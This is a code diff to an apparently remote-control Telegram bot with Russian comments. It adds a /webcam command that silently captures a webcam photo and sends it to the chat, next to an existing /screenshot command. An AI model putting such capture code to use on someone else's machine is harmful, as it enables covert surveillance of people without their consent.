@@ -1,5 +1,6 @@
 import subprocess
 import os
+import cv2
 import platform
 from telegram import Update
 from telegram.ext import (
@@ -77,7 +78,25 @@ async def screenshot(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 # Команда /webcam
 async def webcam(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("Делаю запись с веб-камеры...")
+    try:
+        await update.message.reply_text("Делаю фото с веб-камеры...")
+        # Открываем камеру (обычно 0 - основная камера)
+        cap = cv2.VideoCapture(0)
+        # Делаем снимок
+        ret, frame = cap.read()
+        if not ret:
+            await update.message.reply_text("Не удалось получить изображение с камеры")
+            cap.release()
+            return
+        cap.release()
+        # Сохраняем фото
+        cv2.imwrite("webcam.jpg", frame)
+        # Отправляем в Telegram
+        await update.message.reply_photo(photo=open("webcam.jpg", "rb"))
+        # Удаляем файл
+        os.remove("webcam.jpg")
+    except Exception as e:
+        await update.message.reply_text(f"Ошибка веб-камеры: {e}")
 
 
 # Обработчик текстовых сообщений
